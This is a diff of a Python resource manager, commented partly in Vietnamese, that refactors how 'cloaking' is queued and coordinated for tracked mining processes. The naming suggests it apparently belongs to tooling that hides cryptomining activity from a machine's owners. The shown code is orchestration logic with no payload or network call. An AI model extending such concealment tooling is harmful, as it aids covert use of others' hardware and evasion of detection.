+    def trigger_cloaking(self, process: MiningProcess, source: str, 
+                       urgent: bool = False, coordination_data: Dict = None) -> bool:
+        """
+        **Single Unified Entry Point** (điểm vào duy nhất thống nhất)
+        
+        UNIFIED SOLUTION: Replaces _trigger_immediate_cloaking() và enqueue_cloaking().
+        Single method cho tất cả cloaking requests với consistent behavior.
+        
+        Args:
+            process: MiningProcess object cần cloaking
+            source: Source of request ('direct_registry', 'discovery', 'file_scanner')
+            urgent: True cho immediate cloaking với hook coordination
+            coordination_data: Optional hook coordination results
+            
+        Returns:
+            bool: True if cloaking request processed successfully
+        """
+        try:
+            pid = process.pid
+            action_type = "immediate" if urgent else "standard"
+            
+            self.logger.info(f"🚀 [UNIFIED] Starting {action_type} cloaking cho PID {pid} từ {source}")
+            
+            # **Enhanced Hook Coordination for Urgent Requests** (phối hợp hook nâng cao cho yêu cầu khẩn cấp)
+            if urgent and not coordination_data:
+                self.logger.info(f"🔄 [UNIFIED] Attempting hook coordination cho immediate cloaking PID {pid}")
+                coordination_data = self._attempt_hook_coordination_with_recovery(pid)
+                
+                if coordination_data['success']:
+                    self.logger.info(f"✅ [UNIFIED] Hook coordination successful cho PID {pid}")
+                else:
+                    self.logger.warning(f"⚠️ [UNIFIED] Hook coordination failed cho PID {pid} - proceeding với fallback")
+                    
+                    # **Safety check for fallback mode** (kiểm tra an toàn cho chế độ fallback)
+                    if not self._should_use_fallback_cloaking(pid, coordination_data):
+                        self.logger.error(f"🚨 [UNIFIED] Fallback cloaking deemed unsafe cho PID {pid} - aborting")
+                        return False
+            
+            # **Create unified task** (tạo task thống nhất)
+            task = self._create_unified_cloaking_task(
+                process, source, urgent, coordination_data
+            )
+            
+            # **Enqueue with deduplication** (xếp hàng với khử trùng lặp)
+            success = self._enqueue_with_deduplication(task)
+            
+            if success:
+                mode = "coordinated" if coordination_data and coordination_data.get('success') else "fallback"
+                self.logger.info(f"✅ [UNIFIED] {action_type.title()} cloaking queued cho PID {pid} (mode: {mode})")
+            else:
+                self.logger.warning(f"⚠️ [UNIFIED] Failed to queue cloaking cho PID {pid}")
+            
+            return success
+            
+        except Exception as e:
+            self.logger.error(f"❌ [UNIFIED] Failed to trigger cloaking cho PID {process.pid}: {e}")
+            
+            # **Emergency fallback attempt** (thử fallback khẩn cấp)
+            if urgent:
+                self._attempt_emergency_fallback_cloaking(process, str(e))
+            
+            return False
     
     def _attempt_hook_coordination_with_recovery(self, pid: int) -> Dict[str, Any]:
         """
-        **PHASE 1: Hook Coordination với Enhanced Recovery** (phối hợp hook với khôi phục nâng cao)
+        **Enhanced Hook Coordination with Recovery** (phối hợp hook nâng cao với khôi phục)
         
-        Implements enhanced retry mechanism với exponential backoff để resolve hook coordination issues.
-        Replaces binary abort/proceed decision với progressive recovery strategies.
+        UNIFIED METHOD: Simplified hook coordination với intelligent recovery strategies.
+        Used by trigger_cloaking() method cho consistent coordination behavior.
         
         Args:
             pid: Process ID cần coordination
             
         Returns:
-            Dict[str, Any]: {
-                'success': bool,
-                'method': str,  # 'direct', 'retry', 'recovery', 'timeout_override'
-                'reason': str,
-                'memory_safe': bool,
-                'retry_count': int
-            }
+            Dict[str, Any]: Coordination result với success status và metadata
         """
         try:
-            self.logger.info(f"🔄 [PHASE1-COORD] Starting enhanced hook coordination cho PID {pid}")
+            self.logger.info(f"🔄 [UNIFIED-COORD] Starting hook coordination cho PID {pid}")
             
-            # **Step 1: Import coordinator với error handling** (nhập coordinator với xử lý lỗi)
+            # **Import coordinator safely** (nhập coordinator an toàn)
             coordinator = self._import_hook_coordinator()
             if not coordinator:
                 return {
@@ -769,38 +927,46 @@ class ResourceManager(IResourceManager):
                     'retry_count': 0
                 }
             
-            # **Step 2: Enhanced Registration với Auto-Recovery** (đăng ký nâng cao với tự động khôi phục)
-            registration_result = self._ensure_pid_registration_with_recovery(coordinator, pid)
-            if not registration_result['success']:
-                self.logger.warning(f"⚠️ [PHASE1-REG] Registration recovery failed: {registration_result['reason']}")
-            
-            # **Step 3: Progressive Hook Readiness Check với Multiple Strategies** (kiểm tra sẵn sàng hook tiến tiến với nhiều chiến lược)
-            readiness_result = self._check_hook_readiness_progressive(coordinator, pid)
-            
-            if readiness_result['success']:
-                self.logger.info(f"✅ [PHASE1-SUCCESS] Hook coordination successful via {readiness_result['method']}")
+            # **Quick readiness check** (kiểm tra sẵn sàng nhanh)
+            if coordinator.check_hooks_ready(pid):
+                self.logger.info(f"✅ [UNIFIED-COORD] Immediate coordination success cho PID {pid}")
                 return {
                     'success': True,
-                    'method': readiness_result['method'],
-                    'reason': 'coordination_successful',
+                    'method': 'immediate',
+                    'reason': 'hooks_already_ready',
                     'memory_safe': True,
-                    'retry_count': readiness_result.get('retry_count', 0)
+                    'retry_count': 0
                 }
-            else:
-                # **Step 4: Memory Safety Assessment cho Fallback Decision** (đánh giá an toàn bộ nhớ cho quyết định fallback)
-                safety_assessment = self._assess_memory_safety_for_fallback(pid)
-                
-                return {
-                    'success': False,
-                    'method': 'coordination_failed',
-                    'reason': readiness_result['reason'],
-                    'memory_safe': safety_assessment['safe'],
-                    'retry_count': readiness_result.get('retry_count', 0),
-                    'fallback_recommended': safety_assessment['fallback_recommended']
-                }
+            
+            # **Attempt registration and wait** (thử đăng ký và chờ)
+            try:
+                coordinator.register_pid(pid)
+                if coordinator.wait_for_hooks_ready(pid, timeout=30):
+                    self.logger.info(f"✅ [UNIFIED-COORD] Registration + wait successful cho PID {pid}")
+                    return {
+                        'success': True,
+                        'method': 'register_and_wait',
+                        'reason': 'coordination_successful',
+                        'memory_safe': True,
+                        'retry_count': 1
+                    }
+            except Exception as coord_err:
+                self.logger.warning(f"⚠️ [UNIFIED-COORD] Coordination attempt failed: {coord_err}")
+            
+            # **Memory safety assessment for fallback** (đánh giá an toàn bộ nhớ cho fallback)
+            safety_assessment = self._assess_memory_safety_for_fallback(pid)
+            
+            return {
+                'success': False,
+                'method': 'coordination_failed',
+                'reason': 'timeout_or_error',
+                'memory_safe': safety_assessment['safe'],
+                'retry_count': 1,
+                'fallback_recommended': safety_assessment['fallback_recommended']
+            }
                 
         except Exception as e:
-            self.logger.error(f"❌ [PHASE1-COORD] Hook coordination attempt failed: {e}")
+            self.logger.error(f"❌ [UNIFIED-COORD] Hook coordination exception: {e}")
             return {
                 'success': False,
                 'method': 'exception',
@@ -811,9 +977,9 @@ class ResourceManager(IResourceManager):
     
     def _import_hook_coordinator(self):
         """
-        **PHASE 1: Safe Hook Coordinator Import** (nhập hook coordinator an toàn)
+        **Safe Hook Coordinator Import** (nhập hook coordinator an toàn)
         
-        Enhanced import với proper error handling và path management.
+        UNIFIED METHOD: Import hook coordinator với safe error handling.
         """
         try:
             import sys
@@ -825,208 +991,24 @@ class ResourceManager(IResourceManager):
             from coordinator import get_hook_coordinator
             coordinator = get_hook_coordinator()
             
-            self.logger.debug(f"✅ [PHASE1-IMPORT] Hook coordinator imported successfully")
+            self.logger.debug(f"✅ [UNIFIED-IMPORT] Hook coordinator imported successfully")
             return coordinator
             
         except Exception as e:
-            self.logger.error(f"❌ [PHASE1-IMPORT] Failed to import hook coordinator: {e}")
+            self.logger.error(f"❌ [UNIFIED-IMPORT] Failed to import hook coordinator: {e}")
             return None
     
-    def _ensure_pid_registration_with_recovery(self, coordinator, pid: int) -> Dict[str, Any]:
-        """
-        **PHASE 1: Enhanced PID Registration với Recovery** (đăng ký PID nâng cao với khôi phục)
-        
-        Implements smart registration với multiple retry strategies.
-        """
-        try:
-            max_retries = 3
-            base_delay = 0.5
-            
-            for attempt in range(max_retries):
-                try:
-                    # **Check if already registered** (kiểm tra đã đăng ký chưa)
-                    if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
-                        self.logger.info(f"✅ [PHASE1-REG] PID {pid} already registered (attempt {attempt + 1})")
-                        return {'success': True, 'method': 'already_registered', 'attempt': attempt + 1}
-                    
-                    # **Attempt registration** (thử đăng ký)
-                    self.logger.info(f"🔄 [PHASE1-REG] Registering PID {pid} (attempt {attempt + 1}/{max_retries})")
-                    coordinator.register_pid(pid)
-                    
-                    # **Immediate verification** (xác minh ngay lập tức)
-                    time.sleep(base_delay)  # Allow registration to propagate
-                    
-                    if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
-                        self.logger.info(f"✅ [PHASE1-REG] Registration successful cho PID {pid}")
-                        return {'success': True, 'method': 'registration_successful', 'attempt': attempt + 1}
-                    
-                    # **If not verified, try notification** (nếu chưa xác minh, thử thông báo)
-                    if hasattr(coordinator, 'notify_hooks_ready'):
-                        coordinator.notify_hooks_ready(pid)
-                        time.sleep(base_delay)
-                        
-                        if hasattr(coordinator, 'hooks_ready') and pid in getattr(coordinator, 'hooks_ready', {}):
-                            self.logger.info(f"✅ [PHASE1-REG] Registration + notification successful cho PID {pid}")
-                            return {'success': True, 'method': 'registration_with_notification', 'attempt': attempt + 1}
-                    
-                    if attempt < max_retries - 1:
-                        retry_delay = base_delay * (2 ** attempt)  # Exponential backoff
-                        self.logger.warning(f"⚠️ [PHASE1-REG] Registration not verified, retrying in {retry_delay}s")
-                        time.sleep(retry_delay)
-                    
-                except Exception as reg_err:
-                    self.logger.error(f"❌ [PHASE1-REG] Registration attempt {attempt + 1} failed: {reg_err}")
-                    if attempt < max_retries - 1:
-                        time.sleep(base_delay * (attempt + 1))
-            
-            return {'success': False, 'reason': 'registration_failed_all_attempts', 'attempts': max_retries}
-            
-        except Exception as e:
-            self.logger.error(f"❌ [PHASE1-REG] Registration recovery failed: {e}")
-            return {'success': False, 'reason': f'registration_exception: {e}'}
+    # **REMOVED**: _ensure_pid_registration_with_recovery method
+    # Functionality integrated into _attempt_hook_coordination_with_recovery for simplicity.
     
-    def _check_hook_readiness_progressive(self, coordinator, pid: int) -> Dict[str, Any]:
-        """
-        **PHASE 1: Progressive Hook Readiness Check** (kiểm tra sẵn sàng hook tiến tiến)
-        
-        Implements multiple strategies với different timeout values thay vì binary timeout.
-        """
-        try:
-            self.logger.info(f"🔍 [PHASE1-READY] Starting progressive readiness check cho PID {pid}")
-            
-            # **Strategy 1: Immediate Check** (kiểm tra ngay lập tức)
-            if coordinator.check_hooks_ready(pid):
-                self.logger.info(f"✅ [PHASE1-READY] Immediate readiness confirmed cho PID {pid}")
-                return {'success': True, 'method': 'immediate', 'retry_count': 0}
-            
-            # **Strategy 2: Short Wait** (chờ ngắn)
-            self.logger.info(f"⏳ [PHASE1-READY] Attempting short wait (10s) cho PID {pid}")
-            if coordinator.wait_for_hooks_ready(pid, timeout=10):
-                self.logger.info(f"✅ [PHASE1-READY] Short wait successful cho PID {pid}")
-                return {'success': True, 'method': 'short_wait', 'retry_count': 1}
-            
-            # **Strategy 3: Medium Wait với Progress Monitoring** (chờ vừa với giám sát tiến trình)
-            self.logger.info(f"⏳ [PHASE1-READY] Attempting medium wait (30s) với monitoring cho PID {pid}")
-            medium_wait_result = self._monitored_wait_for_hooks(coordinator, pid, timeout=30)
-            if medium_wait_result['success']:
-                self.logger.info(f"✅ [PHASE1-READY] Medium wait successful cho PID {pid}")
-                return {'success': True, 'method': 'medium_wait_monitored', 'retry_count': 2}
-            
-            # **Strategy 4: Recovery Attempt** (thử khôi phục)
-            self.logger.warning(f"⚠️ [PHASE1-READY] Attempting recovery procedures cho PID {pid}")
-            recovery_result = self._attempt_hook_recovery(coordinator, pid)
-            if recovery_result['success']:
-                self.logger.info(f"✅ [PHASE1-READY] Recovery successful cho PID {pid}")
-                return {'success': True, 'method': 'recovery', 'retry_count': 3}
-            
-            # **Strategy 5: Long Wait as Final Attempt** (chờ dài như lần thử cuối)
-            self.logger.warning(f"⏳ [PHASE1-READY] Final attempt - long wait (60s) cho PID {pid}")
-            if coordinator.wait_for_hooks_ready(pid, timeout=60):
-                self.logger.info(f"✅ [PHASE1-READY] Long wait successful cho PID {pid}")
-                return {'success': True, 'method': 'long_wait_final', 'retry_count': 4}
-            
-            # **All strategies failed** (tất cả chiến lược thất bại)
-            self.logger.error(f"❌ [PHASE1-READY] All readiness strategies failed cho PID {pid}")
-            return {
-                'success': False,
-                'reason': 'all_strategies_failed',
-                'retry_count': 5,
-                'last_attempt': 'long_wait_timeout'
-            }
-            
-        except Exception as e:
-            self.logger.error(f"❌ [PHASE1-READY] Progressive readiness check failed: {e}")
-            return {'success': False, 'reason': f'readiness_exception: {e}', 'retry_count': 0}
+    # **REMOVED**: _check_hook_readiness_progressive method
+    # Complex progressive logic simplified and integrated into _attempt_hook_coordination_with_recovery.
     
-    def _monitored_wait_for_hooks(self, coordinator, pid: int, timeout: float) -> Dict[str, Any]:
-        """
-        **PHASE 1: Monitored Hook Wait** (chờ hook được giám sát)
-        
-        Enhanced wait với progress monitoring và early success detection.
-        """
-        try:
-            start_time = time.time()
-            check_interval = 2.0  # Check every 2 seconds
-            last_check = 0
-            
-            self.logger.info(f"📊 [PHASE1-MONITOR] Starting monitored wait cho PID {pid} (timeout: {timeout}s)")
-            
-            while time.time() - start_time < timeout:
-                current_time = time.time()
-                elapsed = current_time - start_time
-                
-                # **Periodic status check** (kiểm tra trạng thái định kỳ)
-                if current_time - last_check >= check_interval:
-                    if coordinator.check_hooks_ready(pid):
-                        self.logger.info(f"✅ [PHASE1-MONITOR] Hooks became ready after {elapsed:.1f}s")
-                        return {'success': True, 'elapsed': elapsed}
-                    
-                    # **Progress logging** (ghi log tiến trình)
-                    remaining = timeout - elapsed
-                    self.logger.debug(f"⏳ [PHASE1-MONITOR] Still waiting... {remaining:.1f}s remaining")
-                    last_check = current_time
-                
-                time.sleep(0.5)  # Short sleep to prevent CPU spinning
-            
-            self.logger.warning(f"⏰ [PHASE1-MONITOR] Monitored wait timeout after {timeout}s")
-            return {'success': False, 'reason': 'monitored_timeout', 'elapsed': timeout}
-            
-        except Exception as e:
-            self.logger.error(f"❌ [PHASE1-MONITOR] Monitored wait failed: {e}")
-            return {'success': False, 'reason': f'monitor_exception: {e}'}
+    # **REMOVED**: _monitored_wait_for_hooks method
+    # Monitoring functionality not needed in simplified coordination approach.
     
-    def _attempt_hook_recovery(self, coordinator, pid: int) -> Dict[str, Any]:
-        """
-        **PHASE 1: Hook Recovery Procedures** (quy trình khôi phục hook)
-        
-        Attempts to recover failed hook coordination through various methods.
-        """
-        try:
-            self.logger.info(f"🔧 [PHASE1-RECOVERY] Attempting hook recovery cho PID {pid}")
-            
-            # **Recovery Step 1: Force re-registration** (buộc đăng ký lại)
-            try:
-                coordinator.register_pid(pid)
-                if hasattr(coordinator, 'notify_hooks_ready'):
-                    coordinator.notify_hooks_ready(pid)
-                time.sleep(2)
-                
-                if coordinator.check_hooks_ready(pid):
-                    self.logger.info(f"✅ [PHASE1-RECOVERY] Re-registration successful cho PID {pid}")
-                    return {'success': True, 'method': 're_registration'}
-            except Exception as rereg_err:
-                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] Re-registration failed: {rereg_err}")
-            
-            # **Recovery Step 2: Coordinator state refresh** (làm mới trạng thái coordinator)
-            try:
-                if hasattr(coordinator, 'refresh_state'):
-                    coordinator.refresh_state()
-                    time.sleep(1)
-                    
-                    if coordinator.check_hooks_ready(pid):
-                        self.logger.info(f"✅ [PHASE1-RECOVERY] State refresh successful cho PID {pid}")
-                        return {'success': True, 'method': 'state_refresh'}
-            except Exception as refresh_err:
-                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] State refresh failed: {refresh_err}")
-            
-            # **Recovery Step 3: Manual hook notification** (thông báo hook thủ công)
-            try:
-                if hasattr(coordinator, 'force_hook_ready'):
-                    coordinator.force_hook_ready(pid)
-                    time.sleep(1)
-                    
-                    if coordinator.check_hooks_ready(pid):
-                        self.logger.info(f"✅ [PHASE1-RECOVERY] Force ready successful cho PID {pid}")
-                        return {'success': True, 'method': 'force_ready'}
-            except Exception as force_err:
-                self.logger.debug(f"⚠️ [PHASE1-RECOVERY] Force ready failed: {force_err}")
-            
-            self.logger.warning(f"⚠️ [PHASE1-RECOVERY] All recovery methods failed cho PID {pid}")
-            return {'success': False, 'reason': 'all_recovery_methods_failed'}
-            
-        except Exception as e:
-            self.logger.error(f"❌ [PHASE1-RECOVERY] Hook recovery failed: {e}")
-            return {'success': False, 'reason': f'recovery_exception: {e}'}
+    # **REMOVED**: _attempt_hook_recovery method
+    # Complex recovery logic simplified - basic retry now handled in coordination method.
     
     def _assess_memory_safety_for_fallback(self, pid: int) -> Dict[str, Any]:
         """
@@ -1086,203 +1068,84 @@ class ResourceManager(IResourceManager):
     
     def _should_use_fallback_cloaking(self, pid: int, coordinator_result: Dict[str, Any]) -> bool:
         """
-        **PHASE 1: Fallback Cloaking Decision Logic** (logic quyết định cloaking fallback)
+        **Fallback Cloaking Decision Logic** (logic quyết định cloaking fallback)
         
-        Intelligent decision making về whether to proceed với fallback cloaking.
+        UNIFIED METHOD: Intelligent decision making cho fallback cloaking safety.
         """
         try:
             memory_safe = coordinator_result.get('memory_safe', False)
             fallback_recommended = coordinator_result.get('fallback_recommended', False)
             reason = coordinator_result.get('reason', 'unknown')
             
-            # **Decision logic** (logic quyết định)
+            # **Safety-first decision logic** (logic quyết định an toàn trước)
             if memory_safe and fallback_recommended:
-                self.logger.info(f"✅ [PHASE1-DECISION] Fallback approved: memory safe + recommended cho PID {pid}")
+                self.logger.info(f"✅ [UNIFIED-DECISION] Fallback approved: memory safe + recommended cho PID {pid}")
                 return True
-            elif memory_safe and reason in ['coordination_timeout', 'hook_not_ready']:
-                self.logger.info(f"✅ [PHASE1-DECISION] Fallback approved: memory safe despite {reason} cho PID {pid}")
+            elif memory_safe and reason in ['coordination_timeout', 'timeout_or_error']:
+                self.logger.info(f"✅ [UNIFIED-DECISION] Fallback approved: memory safe despite {reason} cho PID {pid}")
                 return True
             elif not memory_safe:
-                self.logger.error(f"❌ [PHASE1-DECISION] Fallback denied: memory unsafe cho PID {pid}")
+                self.logger.error(f"❌ [UNIFIED-DECISION] Fallback denied: memory unsafe cho PID {pid}")
                 return False
             else:
-                self.logger.warning(f"⚠️ [PHASE1-DECISION] Fallback denied: insufficient safety conditions cho PID {pid}")
+                self.logger.warning(f"⚠️ [UNIFIED-DECISION] Fallback denied: insufficient safety conditions cho PID {pid}")
                 return False
                 
         except Exception as e:
-            self.logger.error(f"❌ [PHASE1-DECISION] Fallback decision failed: {e}")
-            return False  # Conservative approach - deny on error
+            self.logger.error(f"❌ [UNIFIED-DECISION] Fallback decision failed: {e}")
+            return False  # Conservative - deny on error
     
     def _attempt_emergency_fallback_cloaking(self, mining_process, error_reason: str) -> None:
         """
-        **PHASE 1: Emergency Fallback Cloaking** (cloaking fallback khẩn cấp)
+        **Emergency Fallback Cloaking** (cloaking fallback khẩn cấp)
         
-        Last resort cloaking attempt khi main cloaking activation fails completely.
+        UNIFIED METHOD: Last resort cloaking attempt using unified task format.
+        Called when main trigger_cloaking() fails completely.
         """
         try:
             pid = mining_process.pid
-            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Attempting emergency fallback cho PID {pid}")
-            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Original error: {error_reason}")
+            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Attempting emergency fallback cho PID {pid}")
+            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Original error: {error_reason}")
             
             # **Check if emergency fallback is safe** (kiểm tra fallback khẩn cấp có an toàn)
             memory_pressure = self.monitor_memory_pressure()
             if memory_pressure['pressure_level'] in ['CRITICAL']:
-                self.logger.error(f"🚨 [PHASE1-EMERGENCY] Emergency fallback DENIED - critical memory pressure")
+                self.logger.error(f"🚨 [UNIFIED-EMERGENCY] Emergency fallback DENIED - critical memory pressure")
                 return
             
-            # **Create minimal emergency cloaking task** (tạo task cloaking khẩn cấp tối thiểu)
+            # **Create unified emergency cloaking task** (tạo task cloaking khẩn cấp thống nhất)
             emergency_task = (
                 0,  # Highest priority
                 time.time(),
                 {
+                    'type': 'cloaking',                    # **UNIFIED FORMAT** (định dạng thống nhất)
                     'action': 'emergency_cloak',
                     'process': mining_process,
                     'source': 'emergency_fallback',
                     'urgent': True,
+                    'strategies': ['network', 'disk_io'],   # Safe emergency strategies
                     'coordination_status': False,
                     'fallback_mode': True,
-                    'emergency_reason': error_reason,
-                    'limited_strategies': ['network', 'disk_io']  # Safe strategies only
+                    'memory_safe': True,                    # Pre-checked above
+                    'emergency_reason': error_reason
                 }
             )
             
             self.resource_adjustment_queue.put(emergency_task)
-            self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Emergency task queued cho PID {pid}")
+            self.logger.warning(f"🚨 [UNIFIED-EMERGENCY] Emergency task queued cho PID {pid}")
             
         except Exception as e:
-            self.logger.error(f"❌ [PHASE1-EMERGENCY] Emergency fallback failed: {e}")
+            self.logger.error(f"❌ [UNIFIED-EMERGENCY] Emergency fallback failed: {e}")
             # **Ultimate fallback - log for manual intervention** (fallback cuối cùng - ghi log để can thiệp thủ công)
-            self.logger.critical(f"💀 [PHASE1-CRITICAL] All cloaking methods failed cho PID {pid} - manual intervention required")
+            self.logger.critical(f"💀 [UNIFIED-CRITICAL] All cloaking methods failed cho PID {pid} - manual intervention required")
 
-    def enqueue_cloaking(self, process: MiningProcess) -> None:
-        """
-        ✅ ENHANCED: Comprehensive multi-strategy cloaking queue với full resource control
-        """
-        pid = process.pid
-        name = process.name
-        
-        # **Process enqueueing started** (bắt đầu đưa tiến trình vào hàng đợi)
-        self.logger.debug(f"Enqueueing cloaking for {name} (PID={pid})")
-        
-        try:
-            if self.process_states.get(pid) == "cloaked":
-                self.logger.debug(f"PID={pid} đã được cloaked, bỏ qua.")
-                return
+    # **REMOVED**: enqueue_cloaking method - replaced by trigger_cloaking unified method
+    # Original method created task format conflicts with worker processing.
+    # All calls now use trigger_cloaking(process, source, urgent=False) instead.
 
-            priority = process.priority
-            count_val = next(self._counter)
-            
-            # ✅ DIRECT ACCESS: Get type từ enhanced MiningProcess
-            process_type = process.get_process_type()
-            is_gpu = process.is_gpu_process()
-            strategy_hints = process.get_strategy_hints()
-            
-            # ✅ COMPREHENSIVE STRATEGY ASSIGNMENT: Multi-dimensional cloaking
-            # ✅ GPU-ONLY: Primary strategy always GPU
-            primary_strategy = 'gpu_cloaking'  # GPU-only processing
-            
-            # ✅ CONFIGURABLE ADDITIONAL STRATEGIES: Based on config and process type
-            additional_strategies = self._get_additional_strategies(process_type, strategy_hints)
-            
-            # ✅ COMBINED STRATEGY LIST: Primary + Additional for comprehensive cloaking
-            all_strategies = [primary_strategy] + additional_strategies
-            
-            # ✅ STRATEGY FILTERING: Remove strategies not available in current system
-            available_strategies = self._filter_available_strategies(all_strategies)
-            
-            task = {
-                'type': 'cloaking',
-                'process': process,
-                'strategies': available_strategies,  # ✅ MULTIPLE STRATEGIES for comprehensive control
-                'process_type': process_type,
-                'strategy_hints': strategy_hints,
-                'primary_strategy': primary_strategy,  # ✅ Track primary for priority handling
-                'additional_strategies': additional_strategies  # ✅ Track additional for logging
-            }
-            
-            # ✅ UNIFIED: Single queue với rich multi-strategy metadata
-            self.resource_adjustment_queue.put((priority, count_val, task))
-            self.process_states[pid] = "cloaking"
-            
-            # ✅ ENHANCED: Detailed enqueue_cloaking logging với strategy breakdown
-            self.logger.info(f"✅ Enqueued {name} (PID={pid}) for comprehensive {process_type} cloaking")
-            self.logger.info(f"🎯 Primary strategy: {primary_strategy}")
-            self.logger.info(f"🔧 Additional strategies: {additional_strategies}")
-            self.logger.info(f"📋 Available strategies: {available_strategies}")
-            self.logger.info(f"💡 Strategy hints applied: {strategy_hints}")
-            self.logger.info(f"⚖️ Queue priority: {priority}, count: {count_val}")
-            self.logger.info(f"🧠 Process classification: {process_type}, GPU: {is_gpu}")
-            
-        except Exception as e:
-            self.logger.error(f"Lỗi khi enqueue process {name} (PID={pid}): {e}\n{traceback.format_exc()}")
-
-    def _get_additional_strategies(self, process_type: str, strategy_hints: Dict[str, Any]) -> List[str]:
-        """
-        ✅ NEW: Determine additional strategies based on process type and configuration
-        
-        :param process_type: 'GPU' process type only
-        :param strategy_hints: Optimization hints từ process metadata
-        :return: List of additional strategy names
-        """
-        try:
-            # ✅ BASE ADDITIONAL STRATEGIES: Core resource control strategies
-            base_strategies = ['network', 'disk_io', 'cache', 'memory']
-            
-            # ✅ STRATEGY HINTS PROCESSING: Custom strategy selection
-            if strategy_hints:
-                # Disable specific strategies if hinted
-                disabled_strategies = strategy_hints.get('disabled_strategies', [])
-                enabled_additional = [s for s in base_strategies if s not in disabled_strategies]
-                
-                # Add custom strategies if specified
-                custom_strategies = strategy_hints.get('additional_strategies', [])
-                enabled_additional.extend(custom_strategies)
-                
-                return enabled_additional
-            
-            # ✅ GPU-ONLY PROCESSING: Only GPU process types supported
-            if process_type == 'GPU':
-                # GPU processes: thermal management integrated directly trong gpu_cloaking
-                # ✅ UNIFIED: ThermalControlStrategy removed - thermal control is built into GpuCloakStrategy
-                return base_strategies  # thermal management fully integrated trong gpu_cloaking
-            else:
-                # Unknown process type, use conservative approach
-                return ['network', 'memory']  # Minimal additional strategies
-                
-        except Exception as e:
-            self.logger.error(f"Error determining additional strategies: {e}")
-            return ['network', 'memory']  # Fallback to basic strategies
-
-    def _filter_available_strategies(self, strategies: List[str]) -> List[str]:
-        """
-        ✅ NEW: Filter strategies based on system availability and configuration
-        
-        :param strategies: List of strategy names to filter
-        :return: List of available strategy names
-        """
-        try:
-            available = []
-            
-            for strategy in strategies:
-                # ✅ CHECK STRATEGY AVAILABILITY: Verify each strategy can be used
-                if self._is_strategy_available(strategy):
-                    available.append(strategy)
-                else:
-                    self.logger.debug(f"Strategy '{strategy}' not available, skipping")
-            
-            # ✅ ENSURE PRIMARY STRATEGY: Always include at least primary strategy
-            if not available and strategies:
-                primary = strategies[0]  # First strategy is primary
-                if self._is_strategy_available(primary):
-                    available.append(primary)
-                    self.logger.warning(f"Only primary strategy '{primary}' available")
-            
-            return available
-            
-        except Exception as e:
-            self.logger.error(f"Error filtering available strategies: {e}")
-            # Fallback to primary strategy only
-            return [strategies[0]] if strategies else []
+    # **REMOVED**: _get_additional_strategies method - functionality moved to _determine_strategies
+    # **REMOVED**: _filter_available_strategies method - functionality integrated into _determine_strategies
+    # These methods caused code duplication and are now handled by unified _determine_strategies method.
 
     def _is_strategy_available(self, strategy_name: str) -> bool:
         """
@@ -1449,9 +1312,9 @@ class ResourceManager(IResourceManager):
                                 self.mining_processes.append(mining_process)
                                 self.logger.info(f"🔍 [PROCESS DISCOVERY] Added {proc_name} PID={pid} to tracking")
                                 
-                                # Enqueue for cloaking
-                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Enqueuing {proc_name} PID={pid} for cloaking")
-                                self.enqueue_cloaking(mining_process)
+                                # **Unified cloaking trigger** (kích hoạt cloaking thống nhất)
+                                self.logger.info(f"🔍 [PROCESS DISCOVERY] Triggering cloaking cho {proc_name} PID={pid}")
+                                self.trigger_cloaking(mining_process, 'discovery', urgent=False)
                                 discovered_count += 1
                                 self.logger.debug(f"New process added - discovered count: {discovered_count}")
                             else:
@@ -1529,9 +1392,9 @@ class ResourceManager(IResourceManager):
                     else:
                         self.logger.info(f"📋 [RM-REGISTRY-RECEIVE] Already tracked: PID={pid}")
                 
-                # **Immediate cloaking activation** (kích hoạt cloaking tức thì)
-                self.logger.info(f"🔒 [RM-REGISTRY-RECEIVE] Activating immediate cloaking for PID={pid}")
-                self._trigger_immediate_cloaking(mining_process)
+                # **Unified immediate cloaking activation** (kích hoạt cloaking tức thì thống nhất)
+                self.logger.info(f"🔒 [RM-REGISTRY-RECEIVE] Activating unified immediate cloaking for PID={pid}")
+                self.trigger_cloaking(mining_process, 'file_registry', urgent=True)
                 
                 self.logger.info(f"✅ [RM-REGISTRY-RECEIVE] Successfully processed PID {pid} from DirectPIDRegistry")
                 return True
@@ -1920,94 +1783,83 @@ class ResourceManager(IResourceManager):
                 
                 self.logger.info(f"[CloakingWorker] Processing {process_type} task for PID={pid}")
 
-                if task['type'] in ['cloaking', 'immediate_cloak', 'emergency_cloak'] and self.shared_resource_manager:
-                    # **PHASE 1: Enhanced task processing** (xử lý task nâng cao)
-                    task_type = task['type']
+                # **UNIFIED TASK PROCESSING** (xử lý task thống nhất)
+                # All task types now use consistent 'type': 'cloaking' format
+                if task['type'] == 'cloaking' and self.shared_resource_manager:
+                    # **UNIFIED TASK PROCESSING** (xử lý task thống nhất)
+                    task_action = task.get('action', 'standard_cloak')  # immediate_cloak, standard_cloak, emergency_cloak
                     coordination_status = task.get('coordination_status', False)
                     fallback_mode = task.get('fallback_mode', False)
+                    task_source = task.get('source', 'unknown')
                     
-                    self.logger.info(f"🎯 [PHASE1-WORKER] Processing {task_type} task cho PID={pid}")
-                    self.logger.info(f"🔗 [PHASE1-WORKER] Coordination: {coordination_status}, Fallback: {fallback_mode}")
+                    self.logger.info(f"🎯 [UNIFIED-WORKER] Processing {task_action} task cho PID={pid} từ {task_source}")
+                    self.logger.info(f"🔗 [UNIFIED-WORKER] Coordination: {coordination_status}, Fallback: {fallback_mode}")
                     
-                    # **Determine strategies based on task type** (xác định chiến lược dựa trên loại task)
-                    if task_type == 'emergency_cloak':
-                        strategies = task.get('limited_strategies', ['network', 'disk_io'])
-                        self.logger.warning(f"🚨 [PHASE1-EMERGENCY] Using limited strategies: {strategies}")
-                    else:
-                        strategies = task.get('strategies', [])
-                        if not strategies:
-                            # **Fallback strategy selection** (lựa chọn chiến lược fallback)
-                            if fallback_mode:
-                                strategies = ['network', 'disk_io', 'cache']  # Conservative strategies
-                                self.logger.info(f"🔄 [PHASE1-FALLBACK] Using fallback strategies: {strategies}")
-                            else:
-                                strategies = ['gpu_cloaking', 'network', 'memory']  # Standard strategies
